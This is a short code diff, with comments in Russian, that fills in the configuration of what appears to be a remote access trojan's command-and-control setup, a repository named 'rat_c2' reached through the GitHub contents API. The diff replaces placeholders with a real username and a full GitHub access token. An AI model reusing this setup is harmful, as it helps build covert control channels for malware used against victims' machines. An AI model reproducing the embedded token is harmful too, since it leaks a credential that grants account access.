@@ -1,8 +1,8 @@
 // ============= КОНФИГУРАЦИЯ =============
 // ⚠️ ВАЖНО: Замени на свои данные!
-const GITHUB_USERNAME = "твой_логин";      // ТВОЙ ЛОГИН GITHUB
+const GITHUB_USERNAME = "gitnikaaaa";      // ТВОЙ ЛОГИН GITHUB
 const GITHUB_REPO = "rat_c2";               // НАЗВАНИЕ РЕПОЗИТОРИЯ
-const GITHUB_TOKEN = "ghp_твой_токен";      // ТВОЙ ТОКЕН
+const GITHUB_TOKEN = "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";      // ТВОЙ ТОКЕН
 
 const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
 const HEADERS = {
